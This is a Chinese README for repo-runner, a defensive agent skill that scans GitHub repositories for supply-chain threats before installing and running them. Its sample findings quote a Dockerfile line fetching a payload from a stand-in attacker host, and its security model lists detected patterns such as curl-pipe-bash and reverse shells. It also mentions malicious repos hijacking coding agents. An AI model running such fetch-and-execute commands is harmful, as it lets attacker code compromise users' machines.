[English](README.md) | **中文**

# repo-runner

### 安全跑通任意 GitHub 仓库 —— 一个 Agent Skill（SKILL.md）

[![smoke](https://github.com/Jia-ben00/repo-runner/actions/workflows/smoke.yml/badge.svg)](https://github.com/Jia-ben00/repo-runner/actions/workflows/smoke.yml)
[![stars](https://img.shields.io/github/stars/Jia-ben00/repo-runner)](https://github.com/Jia-ben00/repo-runner/stargazers)
[![license](https://img.shields.io/github/license/Jia-ben00/repo-runner)](https://github.com/Jia-ben00/repo-runner/blob/main/LICENSE)

把任意仓库（GitHub 链接或本地目录）从"刚克隆完"带到"真正跑起来"：技术栈探测 → 供应链安全门 → 环境准备 → 锁文件优先安装 → 启动服务 → 健康检查，并输出可复现的运行报告。

**零外部依赖、无需 API Key、无常驻服务。纯 Python 标准库脚本 + 一个 SKILL.md。**

![repo-runner 5 阶段工作流示意图](docs/repo-runner-overview.svg)

## 为什么做这个 skill

克隆很容易，跑起来才是痛点：未知技术栈、坏掉的锁文件、缺失的 `.env`、原生编译工具、端口冲突、不稳定的镜像源——还有 2026 年以来利用 `postinstall` 和安装脚本劫持 AI 代理的恶意仓库（[CVE-2026-47729：一个干净的 GitHub 仓库就能诱导 Claude Code 打开反向 shell](https://datawater.com/claude-code-reverse-shell-mozilla/)）。AI 编程代理每天都在克隆仓库，但主流 skill 库（anthropics/skills、superpowers、ECC、awesome-claude-skills）里没有一个提供**安全**的"跑通"工作流。repo-runner 补上这个缺口：

> 大多数 skill 教代理*写*代码；**repo-runner 让代理安全地*跑*别人的代码——不翻车。**

## 特性

- **5 阶段确定性工作流**：探测 → 安全门 → 环境准备 → 安装 → 运行验证
- **带证据的安全门**：扫描远程代码执行、反向 shell、密钥外泄、提权、破坏性命令、供应链投毒与混淆模式——报告文件/行号/证据，风险分级 `low / medium / high / critical`（退出码 `0 / 1 / 2`）
- **锁文件优先安装**：`npm ci`、`pnpm install --frozen-lockfile`、`yarn install --immutable`、`uv sync`、poetry、pip+venv（兼容 PEP 668）
- **开箱即用国内友好**：npm/pip/Go/Ruby/Maven 镜像 + `ghproxy` 克隆兜底
- **输出可复现**：每次运行都以"一行命令重跑"收尾，并附已知问题与规避
- **SBOM 输出（v0.2）**：从锁文件/清单生成 CycloneDX 1.5 SBOM——npm、pnpm、yarn、pip、pyproject、uv、poetry、Go、Rust、Ruby、PHP
- **沙箱隔离运行（v0.2）**：对可疑仓库提供加固 Docker 隔离——非 root、降权（cap-drop）、只读 rootfs、内存/CPU 限制、仓库只读挂载
- **随处可装**：一个文件夹、标准 `SKILL.md` 格式，兼容 Claude Code、Codex、Cursor、OpenClaw 及任何支持 skill 文件夹的代理

## 安装

```bash
# 一条命令（Claude Code / Codex / Cursor / 支持 npx skills 的代理）
npx skills add Jia-ben00/repo-runner

# 手动：把文件夹复制到代理的 skills 目录
cp -r repo-runner ~/.claude/skills/
```

需要：`git`、目标技术栈的运行环境，以及 Python 3.8+（辅助脚本用；无 Python 时工作流仍可手工执行）。

## 使用

直接说：

```
跑一下 https://github.com/owner/repo
把这个项目跑起来
克隆并运行这个项目
```

skill 会依次：

1. **浅克隆**仓库（`--depth 1`，国内网络自动 ghproxy 兜底）
2. **探测**技术栈、包管理器、启动脚本、版本锁定、docker 配置（`scripts/detect_stack.py`）
3. **安全门**扫描危险安装模式——**通过前不执行任何命令**（`scripts/security_gate.py`）
4. **准备**环境：版本锁定（`.nvmrc` / `.python-version`）、`.env` 从 `.env.example` 复制、数据库依赖用 `docker compose`
5. **锁文件优先安装**；网络失败自动换镜像；绝不全局安装
6. **启动**服务并**健康检查**（TCP + 常见健康路径，`scripts/health_check.py`），报告端口/URL + 复现命令

## 示例：安全门能抓到什么

如果一个仓库提交了 `.env`、有 `preinstall` 脚本、Dockerfile 用 `ADD` 拉取远程载荷、还有 git 来源的依赖：

```json
{
  "risk_level": "high",
  "findings": [
    {"severity": "high", "file": "Dockerfile", "line": 2,
     "pattern": "docker-add-remote",
     "evidence": "ADD https://evil.example.com/payload.sh /tmp/p.sh"},
    {"severity": "high", "file": ".env",
     "pattern": "committed-env",
     "detail": "密钥文件被提交到仓库——应该加入 .gitignore"},
    {"severity": "medium", "file": "package.json",
     "pattern": "npm-lifecycle-script",
     "evidence": "preinstall: echo pwned"},
    {"severity": "medium", "file": "package.json",
     "pattern": "git-or-local-dependency",
     "evidence": "left-pad: github:foo/left-pad"}
  ]
}
```

退出码 `2` → 代理立即停止并询问用户，不执行任何命令。干净仓库退出 `0`（`low`），继续安装。

每次运行结束时输出可复现报告：

```
技术栈: node + npm (express, lockfile: package-lock.json)
安全: low (0 findings)
安装: npm ci (187 packages)
启动: node index.js
URL: http://127.0.0.1:3000 (health-checked: 200)
SBOM: 187 components → sbom.json (CycloneDX 1.5)
复现: git clone --depth 1 <url> && cd <dir> && npm ci && node index.js
```

## 5 个阶段

| 阶段 | 做什么 | 关键产物 |
|---|---|---|
| 1. 探测 | 克隆 + 识别技术栈/包管理器/脚本/版本/docker | `detect_stack.py` → JSON |
| 2. 安全门 | 扫描安装/启动面的恶意模式；执行前给出判定 | `security_gate.py` → 风险等级 + 证据 |
| 3. 准备 | 工具链版本、`.env`、compose 依赖、原生编译工具 | 环境清单 |
| 4. 安装 | 锁文件优先、镜像兜底、venv/隔离环境 | 安装好的依赖 |
| 5. 运行验证 | 后台启动、健康检查、日志分析、复现报告 | `health_check.py` + 报告 |

## 脚本

| 脚本 | 用途 | 输出 |
|---|---|---|
| `scripts/detect_stack.py` | 技术栈/包管理器/脚本/版本/docker 探测 | JSON |
| `scripts/security_gate.py` | 安装/启动面供应链与恶意模式扫描 | JSON + 退出码 `0/1/2`；`--sarif` 输出 SARIF 2.1.0 |
| `scripts/health_check.py` | 启动服务的 TCP + HTTP 健康探测 | JSON + 退出码 |
| `scripts/sbom.py` | 从锁文件/清单生成 CycloneDX 1.5 SBOM（npm/pnpm/yarn/pip/uv/poetry/Go/Rust/Ruby/PHP） | JSON |
| `scripts/docker_sandbox.py` | 生成（或 `--exec`）加固 `docker run` 隔离命令——非 root、cap-drop、只读 rootfs、资源限制 | JSON + 退出码 |

## 安全模型

- **执行任何命令之前必须先过安全门。** `curl | bash`、`postinstall` 脚本、Makefile 目标、Dockerfile `RUN`、GitHub Actions、husky 钩子、devcontainer `postCreateCommand` 全部扫描。
- **退出码即契约**：`0` 放行 · `1` 先与用户确认 · `2` 停止询问——high/critical 绝不自动执行。
- **混淆即视为有罪**：base64/hex 载荷、字符串拼接命令、下载后执行——任何隐藏内容都按最坏情况处理。
- 完整人工模式清单：[`references/security-patterns.md`](references/security-patterns.md)。

## Code Scanning 集成

`security_gate.py --sarif <dir>` 输出 [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html)——GitHub code scanning 的标准格式。接入你自己的 CI 后，告警会直接显示在 PR 上：

```yaml
- name: 用 repo-runner security_gate 扫描
  run: python scripts/security_gate.py --sarif . > security_gate.sarif || true
- name: 上传到 code scanning
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: security_gate.sarif
    category: repo-runner
```

告警出现在 **Security → Code scanning** 页面和 PR 内联注释中。严重级映射：`critical`/`high` → error，`medium` → warning，`low`/`info` → note。本仓库自身的 CI 每次 push 到 main 都会上传一份示例。

## GitHub Action

repo-runner 同时提供独立的 **GitHub Action**——不需要 AI 代理，直接在 CI 中扫描任意仓库 URL 或本地路径：

```yaml
- uses: Jia-ben00/repo-runner@v0.5.0
  with:
    target: https://github.com/owner/repo   # 或本地路径如 "."
    fail-on: high                              # low | medium | high
    upload-sarif: true                         # 自动上传到 code scanning
```

**输入参数：**

| 参数 | 默认值 | 说明 |
|---|---|---|
| `target` | （必填） | 仓库 URL（`https://…`）或本地路径 |
| `sarif-output` | `security_gate.sarif` | SARIF 输出文件路径 |
| `fail-on` | `high` | 风险等级达到此阈值时使 job 失败 |
| `upload-sarif` | `true` | 自动上传 SARIF 到 GitHub code scanning |

**输出：** `risk-level`（`low`/`medium`/`high`/`critical`）、`findings`（数量）。

Action 用 `--depth 1` 克隆远程仓库，运行与 skill 相同的安全门，在 high/critical 时可直接阻断流水线。

## 兼容性

| 代理 | 安装方式 |
|---|---|
| Claude Code | `npx skills add Jia-ben00/repo-runner` 或复制到 `~/.claude/skills/` |
| Codex / Cursor / OpenClaw | 把文件夹复制到代理的 skills 目录 |
| 任何 SKILL.md 加载器 | 复制文件夹，重启 |

## 文章 / Articles

- [Your AI Agent Should Never Run a Random GitHub Repo Blindly](docs/blog-intro.md)（英文）— 供应链风险、5 阶段工作流，以及 v0.2 的 SBOM + Docker 沙箱是怎么在 CI 里迭代出来的。

## 许可

[MIT](LICENSE)
